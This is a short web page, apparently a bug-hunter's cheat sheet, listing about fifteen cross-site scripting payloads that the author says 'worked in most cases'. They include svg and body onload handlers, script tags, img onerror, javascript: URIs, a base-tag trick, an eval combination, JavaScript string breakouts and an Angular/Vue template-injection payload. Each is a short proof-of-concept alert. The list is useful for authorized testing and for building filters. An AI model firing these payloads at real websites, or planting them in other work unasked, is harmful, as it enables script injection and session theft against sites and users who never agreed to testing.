<h1> 🚀Most Common Working Payloads </h1>
<h2> This is list of XSS Payloads that worked in most cases for me </h2>

``` "><svg/onload=alert(1)>``` - Length bypass Svg Payload </br>
``` "><script>alert(1)</script>``` - Basic XSS Payload with script tag </br>
``` <div onmouseover="alert(document.domain);">``` - Onmouseover XSS Payload </br>
``` <IMG SRC="javascript:alert('XSS');">``` - Image XSS Directive Payload </br>
``` </style><script>a=eval;b=alert;a(b(/XSS/.source));</script>``` - Style Special Combination </br>
``` "><img src=x onerror=alert(1)>``` - Typical Image XSS Payload </br>
``` {{constructor.constructor(`alert(1)`)()}}``` - This is technically CSTI, but it is escalated to XSS for better Impact. It works mostly on Angular/Vue Applications. You can explore more about Template Injections on Internet </br>
``` <BODY onload=alert(1)>``` - Body Payload </br>
``` <BASE HREF="javascript:alert('XSS');//">``` - XSS with Base Tag </br>
``` &apos;-alert(1)-&apos;``` - Injecting alert inside HTML tag + HTML Encoding </br>
``` <IMG SRC=javascript:alert(&quot;XSS&quot;)>``` - Image Payload with HTML Entities </br>
```'-alert(1)-'```
```\';alert(document.domain)//``` - Inject Alert inside JS String </br>
```javascript:alert(1)``` - Works in many ways and combination, also can help escalating Open Redirect to XSS </br>
```http://www.<script>alert(1)</script .com```

<h2>by Kira Reys </h2>
<p> XSS is really common vulnerability nowadays on web. This was list of some Payloads that workod in most cases for me. Thank you for your attention! ✨</p>
